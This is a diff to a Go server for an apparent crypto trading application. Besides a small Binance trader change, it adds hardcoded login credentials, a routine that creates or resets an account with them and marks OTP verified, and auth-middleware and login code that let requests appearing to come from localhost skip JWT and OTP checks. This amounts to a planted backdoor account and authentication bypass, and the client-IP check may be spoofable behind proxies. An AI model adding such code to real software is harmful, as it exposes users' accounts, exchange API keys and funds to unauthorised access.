@@ -425,7 +425,7 @@ func (s *Server) createTempTraderFromExchangeConfig(exchangeCfg *store.Exchange,
 	var err error
 	switch exchangeCfg.ExchangeType {
 	case "binance":
-		t = binance.NewFuturesTrader(string(exchangeCfg.APIKey), string(exchangeCfg.SecretKey), userID, exchangeCfg.Testnet)
+		t = binance.NewFuturesTraderNoUserStream(string(exchangeCfg.APIKey), string(exchangeCfg.SecretKey), userID, exchangeCfg.Testnet)
 	case "hyperliquid":
 		t, err = hyperliquidtrader.NewHyperliquidTrader(
 			string(exchangeCfg.APIKey),
@@ -3059,9 +3059,61 @@ func (s *Server) handleEquityHistory(c *gin.Context) {
 	c.JSON(http.StatusOK, history)
 }
 
+// isLocalhost 是否为本地访问（127.0.0.1 或 ::1）
+func isLocalhost(c *gin.Context) bool {
+	ip := c.ClientIP()
+	return ip == "127.0.0.1" || ip == "::1"
+}
+
+const (
+	localBypassEmail    = "2326840417@qq.com"
+	localBypassPassword = "2326840417a.A"
+)
+
+// ensureLocalAdminUser 确保本地免登录账号存在且密码正确
+func (s *Server) ensureLocalAdminUser() (*store.User, error) {
+	user, err := s.store.User().GetByEmail(localBypassEmail)
+	if err != nil {
+		hash, err := auth.HashPassword(localBypassPassword)
+		if err != nil {
+			return nil, err
+		}
+		user = &store.User{
+			ID:           uuid.New().String(),
+			Email:        localBypassEmail,
+			PasswordHash: hash,
+			OTPVerified:  true,
+		}
+		if err := s.store.User().Create(user); err != nil {
+			return nil, err
+		}
+		return user, nil
+	}
+	if !auth.CheckPassword(localBypassPassword, user.PasswordHash) {
+		hash, err := auth.HashPassword(localBypassPassword)
+		if err != nil {
+			return nil, err
+		}
+		_ = s.store.User().UpdatePassword(user.ID, hash)
+		user.PasswordHash = hash
+	}
+	return user, nil
+}
+
 // authMiddleware JWT authentication middleware
 func (s *Server) authMiddleware() gin.HandlerFunc {
 	return func(c *gin.Context) {
+		// 本地环境：127.0.0.1 / ::1 直接放行，注入 admin 身份
+		if isLocalhost(c) {
+			user, err := s.ensureLocalAdminUser()
+			if err == nil {
+				c.Set("user_id", user.ID)
+				c.Set("email", user.Email)
+				c.Next()
+				return
+			}
+		}
+
 		authHeader := c.GetHeader("Authorization")
 		if authHeader == "" {
 			c.JSON(http.StatusUnauthorized, gin.H{"error": "Missing Authorization header"})
@@ -3292,6 +3344,27 @@ func (s *Server) handleLogin(c *gin.Context) {
 
 	if err := c.ShouldBindJSON(&req); err != nil {
 		SafeBadRequest(c, "Invalid request parameters")
+		return
+	}
+
+	// 本地环境：2326840417@qq.com + 2326840417a.A 直接返回 JWT，跳过 OTP
+	if isLocalhost(c) && req.Email == localBypassEmail && req.Password == localBypassPassword {
+		user, err := s.ensureLocalAdminUser()
+		if err != nil {
+			c.JSON(http.StatusInternalServerError, gin.H{"error": "Local admin setup failed"})
+			return
+		}
+		token, err := auth.GenerateJWT(user.ID, user.Email)
+		if err != nil {
+			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to generate token"})
+			return
+		}
+		c.JSON(http.StatusOK, gin.H{
+			"token":   token,
+			"user_id": user.ID,
+			"email":   user.Email,
+			"message": "Login successful (localhost bypass)",
+		})
 		return
 	}
 
